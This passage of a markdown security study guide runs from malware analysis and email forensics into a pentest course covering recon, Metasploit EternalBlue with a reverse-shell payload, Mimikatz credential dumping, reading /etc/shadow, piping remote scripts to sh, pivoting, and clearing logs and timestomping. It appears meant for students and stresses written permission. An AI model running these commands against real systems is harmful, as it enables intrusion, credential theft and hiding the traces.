																																				# Network imports: connect, send, recv, WSAStartup
																																				
																																				# PE Structure:
																																				# sudo apt install pev
																																				pev malware.exe
																																				
																																				# Entropy (high = packed/encrypted):
																																				python3 -c "
																																				import math, collections
																																				with open('malware.exe', 'rb') as f:
																																				data = f.read()
																																				counter = collections.Counter(data)
																																				entropy = -sum((c/len(data))*math.log2(c/len(data)) for c in counter.values())
																																				print(f'Entropy: {entropy:.2f}')
																																				print('PACKED/ENCRYPTED' if entropy > 7.0 else 'NORMAL')
																																				"
																																				```
																																				
																																				### Dynamic Analysis (in VM!)
																																				
																																				```bash
																																				# ── SETUP ISOLATED VM FIRST ──────────────────────────────────────
																																				# NEVER run malware on real machine!
																																				# Create a Windows VM in VirtualBox
																																				# Snapshot BEFORE running malware
																																				# Restore snapshot AFTER analysis
																																				
																																				# ── MONITORING TOOLS (run in VM BEFORE executing malware) ────────
																																				# Process Monitor (Procmon) → File, Registry, Network activity
																																				# Process Explorer → Process tree
																																				# Wireshark → Network connections
																																				# Regshot → Registry before/after comparison
																																				
																																				# ── WHAT TO RECORD ────────────────────────────────────────────────
																																				# Files created: Where? What names?
																																				# Registry changes: Persistence keys?
																																				# Network connections: What IPs? What ports?
																																				# Processes spawned: Child processes?
																																				# APIs called: What Windows functions?
																																				
																																				# ── AUTOMATED SANDBOX ─────────────────────────────────────────────
																																				# Online sandboxes (free):
																																				# any.run → interactive sandbox
																																				# hybrid-analysis.com → automated analysis
																																				# joe.sandbox → detailed report
																																				# cuckoo sandbox → self-hosted
																																				
																																				# Cuckoo Sandbox setup:
																																				sudo apt install cuckoo
																																				cuckoo submit malware.exe
																																				```
																																				
																																				---
																																				
																																				## 10. Email Forensics
																																				
																																				```python
																																				# email_forensics.py
																																				# Analyze email headers to trace origin
																																				
																																				import email
																																				import re
																																				from email.header import decode_header
																																				
																																				def analyze_email(email_file):
																																				"""Full email forensics analysis"""
																																				
																																				with open(email_file, 'rb') as f:
																																				msg = email.message_from_bytes(f.read())
																																				
																																				print("\n=== EMAIL FORENSICS ANALYSIS ===\n")
																																				
																																				# Basic headers
																																				print("[+] Basic Info:")
																																				print(f"    From:    {msg.get('From')}")
																																				print(f"    To:      {msg.get('To')}")
																																				print(f"    Subject: {msg.get('Subject')}")
																																				print(f"    Date:    {msg.get('Date')}")
																																				
																																				# Received headers (trace the path!)
																																				print("\n[+] EMAIL PATH (Received headers - bottom to top is actual path):")
																																				received = msg.get_all('Received', [])
																																				for i, hop in enumerate(reversed(received)):
																																					print(f"\n    Hop {i+1}:")
																																					print(f"    {hop[:200]}")
																																					
																																					# Extract IPs from Received headers
																																					ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', hop)
																																					for ip in ips:
																																						if not ip.startswith(('192.168', '10.', '127.')):
																																							print(f"    → External IP: {ip}")
																																							
																																							# Authentication results
																																							print("\n[+] Email Authentication:")
																																							spf = msg.get('Received-SPF')
																																							dkim = msg.get('DKIM-Signature')
																																							dmarc = msg.get('DMARC-Filter')
																																							
																																							print(f"    SPF:   {spf or 'Not present'}")
																																							print(f"    DKIM:  {'Present' if dkim else 'Not present'}")
																																							print(f"    DMARC: {dmarc or 'Not present'}")
																																							
																																							# Spoofing indicators
																																							print("\n[!] SPOOFING CHECKS:")
																																							from_addr = msg.get('From', '')
																																							reply_to = msg.get('Reply-To', '')
																																							
																																							if reply_to and reply_to not in from_addr:
																																								print(f"    ⚠ Reply-To differs from From!")
																																								print(f"      From:     {from_addr}")
																																								print(f"      Reply-To: {reply_to}")
																																								print(f"      → Possible phishing! Replies go to different address")
																																								
																																								# Attachments
																																								print("\n[+] ATTACHMENTS:")
																																								for part in msg.walk():
																																									if part.get_content_maintype() == 'multipart':
																																										continue
																																										if part.get('Content-Disposition') is None:
																																											continue
																																											
																																											filename = part.get_filename()
																																											if filename:
																																												print(f"    File: {filename}")
																																												content_type = part.get_content_type()
																																												print(f"    Type: {content_type}")
																																												
																																												# Suspicious extensions
																																												dangerous_ext = ['.exe', '.bat', '.cmd', '.ps1', '.vbs',
'.js', '.jar', '.scr', '.pif']
for ext in dangerous_ext:
	if filename.lower().endswith(ext):
		print(f"    ⚠ DANGEROUS FILE TYPE: {ext}")
		
		# Save attachment for analysis
		payload = part.get_payload(decode=True)
		if payload:
			with open(f"attachment_{filename}", 'wb') as f:
			f.write(payload)
			print(f"    → Saved to: attachment_{filename}")
			print(f"    SHA256: ", end="")
			import hashlib
			print(hashlib.sha256(payload).hexdigest())
			
			# analyze_email('suspicious_email.eml')
			```
			
			---
			
			# PART B — PRO HACKER SKILLS
			
			## 11. Pro Hacker Mindset
			
			### How Real Hackers Think
			
			```
			AMATEURS think: "What tools can I run?"
			PROFESSIONALS think: "What information do I need to reach my goal?"
			
			AMATEURS: Run Nmap, then Metasploit, then give up
			PROFESSIONALS: Methodical, patient, adaptive, creative
			
			THE PRO HACKER PROCESS:
			1. Define the goal clearly
			"Get admin access to this web server"
			
			2. Map the attack surface
			"What's exposed? Web app, SSH, email server, VPN"
			
			3. Research each surface
			"What software versions? Known CVEs? Misconfigs?"
			
			4. Plan multiple attack vectors
			"Try web app first (lowest noise), then SSH brute force if needed"
			
			5. Execute methodically
			"Try A → fail → document → try B → adjust..."
			
			6. Adapt when things don't work
			"Port 80 is closed? Try 8080, 8443, 443..."
			
			7. Document EVERYTHING
			"If you find it, document where, when, how"
			```
			
			### The Pro Hacker Rules
			
			```
			Rule 1: PATIENCE
			Real attacks take hours, days, weeks
			Don't give up after 5 minutes
			Some vulnerabilities need waiting (timing, user activity)
			
			Rule 2: RESEARCH BEFORE ACTING
			Know your target before touching it
			Understand what you're attacking
			RTFM (Read The Fine Manual)
			
			Rule 3: STEALTH WHEN NEEDED
			Noisy attacks trigger IDS/IPS
			Start passive, go active only when needed
			Understand what you're triggering
			
			Rule 4: DOCUMENT EVERYTHING
			Screenshots of every finding
			Commands run and their output
			Timeline of actions
			
			Rule 5: KNOW WHEN TO STOP
			Don't escalate beyond scope
			Don't destroy data
			Don't stay when you have what you need
			
			Rule 6: CONTINUOUS LEARNING
			New CVEs daily
			New techniques weekly
			Never stop reading
			```
			
			---
			
			## 12. Complete Penetration Testing Methodology
			
			### The Standard Pentest Phases
			
			```
			Phase 1: PRE-ENGAGEMENT
			Get written permission (scope document)!
			Define: what to test, what NOT to test, timeframe
			Legal protection for both parties
			Without this = crime
			
			Phase 2: RECONNAISSANCE
			Passive: OSINT, Google, Shodan (no touching target)
			Active: Scanning, enumeration (touches target)
			
			Phase 3: SCANNING & ENUMERATION
			Port scanning: What's open?
			Service detection: What version?
			Vulnerability scanning: Any known issues?
			Manual enumeration: What can I see?
			
			Phase 4: EXPLOITATION
			Use found vulnerabilities to get access
			Try multiple vectors (don't give up on first fail)
			Document everything
			
			Phase 5: POST-EXPLOITATION
			What can I do with this access?
			Escalate privileges
			Pivot to other systems
			Maintain access (if in scope)
			
			Phase 6: REPORTING
			Executive summary (for management)
			Technical details (for IT team)
			Risk ratings
			Remediation steps
			Evidence (screenshots, logs)
			```
			
			---
			
			## 13. Advanced Reconnaissance
			
			```bash
			# ── PASSIVE RECON (No touching target) ────────────────────────────
			
			# Google Dorking:
			site:target.com
			site:target.com filetype:pdf
			site:target.com inurl:admin
			site:target.com intitle:"index of"
			"@target.com" email addresses
			site:target.com ext:sql OR ext:php OR ext:bak
			
			# Shodan (internet-connected device search):
			# shodan.io
			hostname:target.com
			org:"Target Company Name"
			ssl:"target.com"
			
			# Certificate Transparency (find subdomains):
			# crt.sh/?q=%.target.com
			curl -s "https://crt.sh/?q=%.target.com&output=json" | \
			python3 -c "import json,sys; [print(x['name_value']) for x in json.load(sys.stdin)]" | \
			sort -u
			
			# WHOIS:
			whois target.com           # Domain registration info
			whois 1.2.3.4              # IP ownership
			
			# DNS Enumeration:
			nmap --script dns-brute target.com
			dig target.com ANY
			dig @8.8.8.8 target.com MX  # Mail servers
			
			# Subdomain enumeration:
			sudo apt install subfinder amass
			subfinder -d target.com
			amass enum -d target.com
			
			# ── ACTIVE RECON ──────────────────────────────────────────────────
			
			# Port scanning:
			nmap -sS -p- -T4 target.com               # All ports, SYN scan
			nmap -sV -sC -p 80,443,22,8080 target.com # Version + default scripts
			nmap -A -p- target.com                    # Full aggressive scan
			nmap --script vuln target.com             # Vulnerability scan
			
			# Web application recon:
			nikto -h http://target.com          # Web vulnerability scan
			dirb http://target.com              # Directory brute force
			gobuster dir -u http://target.com \
			-w /usr/share/wordlists/dirb/common.txt
			
			# Technology fingerprinting:
			whatweb target.com
			wappalyzer (browser extension)
			
			# Email harvesting:
			theHarvester -d target.com -l 100 -b all
			```
			
			---
			
			## 14. Exploitation Mastery
			
			```bash
			# ── METASPLOIT MASTERY ────────────────────────────────────────────
			msfconsole
			
			# Search for exploits:
			search type:exploit platform:windows name:smb
			search cve:2017-0144    # EternalBlue
			
			# Use exploit:
			use exploit/windows/smb/ms17_010_eternalblue
			show options
			set RHOSTS 192.168.1.100
			set PAYLOAD windows/x64/meterpreter/reverse_tcp
			set LHOST 192.168.1.10
			set LPORT 4444
			run
			
			# ── MANUAL EXPLOITATION ───────────────────────────────────────────
			
			# Buffer overflow:
			# 1. Find vulnerable function (gets, strcpy, scanf)
			# 2. Determine offset to EIP
			# 3. Find return address
			# 4. Build payload: [padding][return address][shellcode]
			
			# Web exploitation with Python:
			python3 exploit.py
			
			# ── COMMON VULNERABILITIES TO KNOW ───────────────────────────────
			# CVE-2021-44228 Log4Shell (CVSS 10.0!)
			# CVE-2021-34527 PrintNightmare
			# CVE-2020-0796  SMBGhost
			# CVE-2019-0708  BlueKeep (RDP)
			# CVE-2017-0144  EternalBlue (SMB)
			# CVE-2014-6271  Shellshock (Bash)
			# CVE-2014-0160  Heartbleed (OpenSSL)
			```
			
			---
			
			## 15. Post-Exploitation
			
			```bash
			# ── WINDOWS POST-EXPLOITATION ────────────────────────────────────
			
			# System enumeration:
			whoami /all                   # Current user + privileges
			net user                      # All local users
			net localgroup administrators  # Admin group members
			ipconfig /all                 # Network config
			netstat -ano                  # Network connections
			tasklist                      # Running processes
			sc query                      # Services
			
			# Privilege escalation:
			# PowerUp.ps1 (automated Windows privesc)
			powershell -ep bypass -c "Import-Module PowerUp.ps1; Invoke-AllChecks"
			
			# Credential dumping (as admin/SYSTEM):
			# Mimikatz:
			mimikatz.exe
			privilege::debug
			sekurlsa::logonpasswords   # Clear text passwords from memory!
			lsadump::sam               # SAM database hashes
			
			# ── LINUX POST-EXPLOITATION ──────────────────────────────────────
			
			# System enumeration:
			id && whoami
			uname -a                    # Kernel version (for kernel exploits)
			cat /etc/passwd             # All users
			sudo -l                     # What can I sudo?
			find / -perm -4000 2>/dev/null  # SUID binaries
			cat /etc/crontab            # Cron jobs
			env                         # Environment variables
			history                     # Command history
			
			# Privilege escalation:
			# LinPEAS (automated Linux privesc):
			curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
			
			# GTFOBins (https://gtfobins.github.io/):
			# Find SUID binary → check GTFOBins → escalate
			sudo -l  # shows sudo rights
			# If sudo nmap → can escalate!
			```
			
			---
			
			## 16. Pivoting
			
			```bash
			# PIVOTING = using compromised machine to reach other networks
			
			# ── SSH TUNNELING ──────────────────────────────────────────────────
			
			# Local port forwarding:
			# Access internal_server:80 through compromised machine
			ssh -L 8080:internal_server:80 user@compromised_machine
			
			# Dynamic SOCKS proxy (route all traffic through compromised):
			ssh -D 1080 user@compromised_machine
			# Now configure proxychains to use 127.0.0.1:1080
			
			# ── METASPLOIT PIVOTING ───────────────────────────────────────────
			
			# Once you have a meterpreter session:
			# Add route through compromised machine:
			route add 10.0.0.0/8 [session_id]
			
			# Now all Metasploit traffic to 10.0.0.0/8 goes through the pivot!
			use auxiliary/scanner/portscan/tcp
			set RHOSTS 10.0.0.1-254
			run  # Scanning internal network through pivot
			
			# ── PROXYCHAINS ───────────────────────────────────────────────────
			
			# Configure:
			echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
			
			# Use any tool through pivot:
			proxychains nmap -sT 10.0.0.1
			proxychains curl http://internal-site.local
			proxychains firefox
			```
			
			---
			
			## 17. Covering Tracks
			
			```bash
			# ── LINUX ──────────────────────────────────────────────────────────
			
			# Clear bash history:
			history -c              # Clear current session
			echo "" > ~/.bash_history
			unset HISTFILE          # Stop recording this session
			
			# Modify log files:
			# Remove your IP from auth.log:
			sed -i '/192.168.1.10/d' /var/log/auth.log
			
			# Change file timestamps:
			touch -t 202001011200 suspicious_file.txt
			# Now appears to be from Jan 1, 2020
			
			# ── WINDOWS ───────────────────────────────────────────────────────
			
			# Clear event logs (suspicious itself!):
			wevtutil cl System
			wevtutil cl Security
			wevtutil cl Application
			
			# In Meterpreter:
			clearev   # Clear Windows event logs
			
			# Timestomping:
			timestomp file.txt -m "01/01/2020 12:00:00"
			
			# NOTE: Clearing logs is ITSELF suspicious
			# Modern SOCs alert on "log cleared" events
			# Better: blend in rather than erase
			```
			
			---
			
			## 18. Report Writing
			
			### Professional Pentest Report Structure
			
			```
			1. EXECUTIVE SUMMARY (for management, non-technical)
			- What was tested
			- Overall risk level
			- Key findings summary
			- Business impact
			- Critical recommendations
			
			2. METHODOLOGY
			- Testing approach
			- Tools used
			- Testing period
			
			3. FINDINGS (for each vulnerability):
			Title: SQL Injection in Login Page
			Severity: Critical (CVSS 9.8)
			Location: https://target.com/login - username parameter
			Description: What it is
			Impact: What attacker can do
			Evidence: Screenshot + steps to reproduce
			Recommendation: How to fix
			References: CVE numbers, OWASP, etc.
			
			4. RISK MATRIX
			Map all findings by severity + likelihood
			
			5. APPENDIX
			Full tool output
			Raw scan results
			```
			
			### CVSS Scoring (How to Rate Severity)
			
			```
			CVSS = Common Vulnerability Scoring System (0.0 - 10.0)
			
			Components:
			Attack Vector:      Network/Adjacent/Local/Physical
			Attack Complexity:  Low/High
			Privileges Required: None/Low/High
			User Interaction:   None/Required
			Scope:              Unchanged/Changed
			Confidentiality:    None/Low/High
			Integrity:          None/Low/High
			Availability:       None/Low/High
			
			Ratings:
			0.0:      None
			0.1-3.9:  Low
			4.0-6.9:  Medium
			7.0-8.9:  High
			9.0-10.0: Critical
			
			SQL Injection → typically CVSS 9.8 (Critical)
			Network attack, Low complexity, No privileges, No interaction
			High impact on Confidentiality, Integrity, Availability
			
			XSS (Stored) → typically CVSS 8.8 (High)
			Network, Low complexity, Low privileges, User interaction required
			```
			
			---
			
			## 19. CTF Strategy
			
			### How to Win CTFs
			
			```
			CTF = Capture The Flag competition
			Types:
			Jeopardy: Solve challenges, get points, earn flags
			Attack/Defense: Attack other teams, defend your own
			King of the Hill: Maintain access to a server
			
			JEOPARDY CATEGORIES:
			Web:         XSS, SQLi, SSRF, IDOR, deserialization
			Crypto:      RSA, AES, hashing, encodings
			Reversing:   Disassemble binaries, find hidden logic
			Pwn:         Buffer overflows, ROP chains, heap exploits
			Forensics:   Disk images, memory dumps, pcap analysis
			OSINT:       Find information from clues online
			Misc:        Everything else
			
			CTF STRATEGY:
			1. Read ALL challenges first
			2. Start with ones you know
			3. Look for quick wins (easy + medium)
			4. Don't get stuck — move on, come back
			5. Collaborate with team
			6. Google is your friend
			7. Look for the flag format first (often: CTF{...})
			```
			
			### Practice Platforms
			
			```
			BEGINNER:
			PicoCTF:        picoctf.org (school-level, great for learning)
			OverTheWire:    overthewire.org (Linux skills, very good)
			TryHackMe:      tryhackme.com (guided, beginner friendly)
			
			INTERMEDIATE:
			HackTheBox:     hackthebox.com (realistic machines)
			VulnHub:        vulnhub.com (download VMs, attack them)
			CTFtime:        ctftime.org (upcoming CTF events worldwide)
			
			ADVANCED:
			DEFCON CTF:     Top-tier global competition
			Google CTF:     Very difficult
			pwn.college:    Expert exploitation training
			```
			
			---
			
			## 20. Career Roadmap
			
			### Certifications (In Order)
			
			```
			STAGE 1 — FOUNDATION (Student level)
			✓ CompTIA Security+    → Entry-level, widely recognized
			✓ CompTIA Network+     → Networking fundamentals
			Cost: ~$400 each
			
			STAGE 2 — TECHNICAL (Junior level)
			✓ CEH (Certified Ethical Hacker)  → Theory-heavy but recognized by HR
			✓ eJPT (eLearnSecurity Junior)    → Very practical, affordable
			Cost: $200-500
			
			STAGE 3 — PROFESSIONAL (Mid level)
			✓ OSCP (Offensive Security)       → GOLD STANDARD for pentesters
			Hands-on 24hr exam, respected globally
			✓ GPEN (GIAC Penetration Tester)  → Also excellent
			Cost: $1500+
			
			STAGE 4 — EXPERT
			✓ OSEP (Evasion Techniques)
			✓ OSED (Exploit Development)
			✓ GXPN (Expert Penetration)
			✓ OSCE3 (Triple OSCE)
			
			FORENSICS SPECIFIC:
			✓ EnCE (EnCase Certified Examiner)
			✓ GCFE (GIAC Certified Forensic Examiner)
			✓ GCFA (GIAC Certified Forensic Analyst)
			✓ CHFI (EC-Council Computer Hacking Forensic)
			```
			
			### Learning Path Timeline
			
			```
			YEAR 1 (Where you are now):
			✓ Complete: SQL Injection, XSS, basic attacks (done!)
			✓ Complete: WiFi attacks (done!)
			✓ Complete: Reverse engineering (done!)
			→ Do: 50 TryHackMe rooms
			→ Do: Get CompTIA Security+
			→ Do: Start HackTheBox easy machines
			→ Do: Enter 3 beginner CTFs
			
			YEAR 2:
			→ Do: 100 HackTheBox machines (easy + medium)
			→ Do: Get OSCP (game changer!)
			→ Do: Bug bounty hunting (earn money!)
			→ Do: Digital forensics practice (this guide!)
			→ Do: Build a home lab
			
			YEAR 3:
			→ Do: Specialize (malware, web, network, forensics)
			→ Do: Enter top CTF teams
			→ Do: Publish security research/blog
			→ Do: Speak at security conferences
			→ Job: Mid-level security researcher
			
			CAREER OPTIONS:
			Penetration Tester        → $80,000-$150,000/year
			Security Researcher       → $100,000-$200,000+/year
			Malware Analyst           → $80,000-$150,000/year
			Digital Forensics Analyst → $70,000-$120,000/year
			Bug Bounty Hunter         → $10,000-$1,000,000+/year (variable!)
			Red Team Operator         → $100,000-$180,000/year
			SOC Analyst               → $50,000-$90,000/year (entry point)
			```
			
			### Daily Practice Routine
			
			```
			DAILY (1-2 hours):
			30 min: One HackTheBox challenge OR TryHackMe room
			30 min: Read one security blog post or CVE writeup
			30 min: Practice one technique from your notes
			
			WEEKLY:
			Build/update your notes
			Try one new tool
			Watch one security conference talk (YouTube: DEFCON, BlackHat)
			
			MONTHLY:
			Participate in a CTF event
			Write a blog post about something you learned
			Review and update your home lab
			
			RESOURCES TO FOLLOW:
			Twitter/X: @_xpn_, @HackingArticles, @TCM_Security
			YouTube: IppSec (HackTheBox walkthroughs), LiveOverflow, John Hammond
			Blogs: hackingarticles.in, pentesterlab.com, portswigger.net/blog
			Discord: TryHackMe community, HackTheBox community
			Reddit: r/netsec, r/hacking, r/digitalforensics
			```
			
			---
			
			## Quick Reference — Tool Commands
			
			```bash
			# FORENSICS QUICK COMMANDS
			md5sum file          # Hash file
			sha256sum file       # SHA256 hash
			file suspicious      # What type is this file?
			strings file         # Extract text strings
			xxd file | head      # Hex dump
			exiftool image.jpg   # Extract metadata
			binwalk firmware.bin # Analyze firmware
			foremost disk.img    # Recover deleted files
				volatility3 -f mem.dmp windows.pslist  # List processes in memory
				tshark -r cap.pcap -Y "http"           # Filter HTTP in pcap
				sqlite3 db.sqlite ".tables"            # List SQLite tables
				
				# RECON QUICK COMMANDS
				nmap -sV -sC target.com    # Scan with scripts
				gobuster dir -u http://target.com -w wordlist.txt
				subfinder -d target.com    # Find subdomains
				nikto -h http://target.com # Web vuln scan
				whois target.com           # Domain info
				
				# EXPLOITATION QUICK COMMANDS
				msfconsole                 # Start Metasploit
				searchsploit keyword       # Search exploits
				python3 exploit.py         # Run custom exploit
				
				# POST-EXPLOITATION QUICK COMMANDS (Linux)
				id && whoami && hostname && uname -a
				find / -perm -4000 2>/dev/null   # SUID files
				sudo -l                           # Sudo rights
				cat /etc/shadow                   # Password hashes
				history                           # Command history
				netstat -tulpn                    # Open ports
				```
				
				---
				
				*Your journey from student to professional starts here.*
				*Every expert was once a beginner. The difference is consistent practice.*
				*Stay ethical, stay legal, keep learning.* 🛡️
